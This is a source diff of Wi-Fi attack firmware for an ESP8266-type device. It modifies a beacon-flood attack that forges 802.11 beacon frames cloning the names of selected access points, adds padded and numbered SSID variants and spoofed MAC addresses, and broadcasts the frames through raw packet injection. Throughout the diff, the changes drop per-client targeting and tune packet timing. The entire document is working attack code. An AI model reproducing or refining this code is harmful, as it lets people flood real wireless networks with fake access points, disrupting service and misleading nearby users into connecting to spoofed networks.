@@ -50,7 +50,7 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
 
   for(int i=0;i<6;i++){
     //set target (client)
-    packet[4+i] = _client._get(i);
+    //packet[4+i] = _client._get(i);
     //set source (AP)
     packet[10+i] = packet[16+i] = _ap._get(i);
   }
@@ -83,16 +83,18 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
 }
 
 bool Attack::send(){
-  delay(1); //less packets will be dropped
   if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
-    if(debug){
+    /*if(debug){
       Serial.print(packetSize);
       Serial.print(" : ");
       PrintHex8(packet, packetSize);
       Serial.println("");
-    }
+    }*/
     return false;
-  }else return true;
+  }else{
+    delay(1); //less packets are beeing dropped
+    return true;
+  }
 }
 
 void Attack::run(){
@@ -143,9 +145,12 @@ void Attack::run(){
     if(debug) Serial.println(" done ");
   }
 
+  /* =============== Beacon Attack =============== */
   if(isRunning[1] && currentMillis-prevTime[1] >= 100){
     if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
 
+    //int a = apScan.getFirstTarget();
+    
     for(int a=0;a<apScan.results;a++){
       if(apScan.isSelected(a)){
         String _ssid = apScan.getAPName(a);
@@ -158,23 +163,27 @@ void Attack::run(){
 
         wifi_set_channel(_ch);
 
-        int _selectedClients = 0;
+        //int _selectedClients = 0;
 
-        for(int c=0;c<macListLen;c++){
+        for(int c=0;c<macListLen/apScan.selectedSum;c++){
           String _apName = _ssid;
               
           if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP           "
           else if(c < _restSSIDLen*2){
-            _apName = "."+_apName;
-            for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. ".SAMPLEAP   "
+            _apName = " "+_apName;
+            for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. " SAMPLEAP   "
+          }else if(c < _restSSIDLen*3){
+            _apName += ".";
+            for(int d=0;d<(_restSSIDLen-1)-c/3;d++) _apName += " ";//e.g. ".SAMPLEAP   "
           } else{
-            for(int d=0; d < _restSSIDLen-2; d++) _apName += " ";
+            for(int d=0; d < _restSSIDLen-1; d++) _apName += " ";
             _apName += (String)c;//e.g. "SAMPLEAP        78"
           }
 
           //build a broadcast packet for this AP & SSID
           buildBeacon(beaconAdrs._get(c),_broadcast,_apName,_ch,apScan.getAPEncryption(a) != "none");
 
+          /*
           for(int b=0;b<clientScan.results;b++){
             if(clientScan.getClientSelected(b)){
               _selectedClients++;
@@ -184,16 +193,15 @@ void Attack::run(){
               
               if(send()) packetsCounter[1]++;
             }
-          }
+          }*/
 
           //if no clients are selected send the broadcast packet
-          if(_selectedClients == 0) if(send()) packetsCounter[1]++;
+          /*if(_selectedClients == 0)*/ if(send()) packetsCounter[1]++;
         }
         
       }
     }
     
-    prevTime[1] = millis();
     stati[1] = (String)(packetsCounter[1]*10)+"pkts/s";
     packetsCounter[1] = 0;
     macListChangeCounter++;
@@ -202,6 +210,7 @@ void Attack::run(){
       macListChangeCounter = 0;
     }
     if(debug) Serial.println(" done ");
+    prevTime[1] = millis();
   }
 
   if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
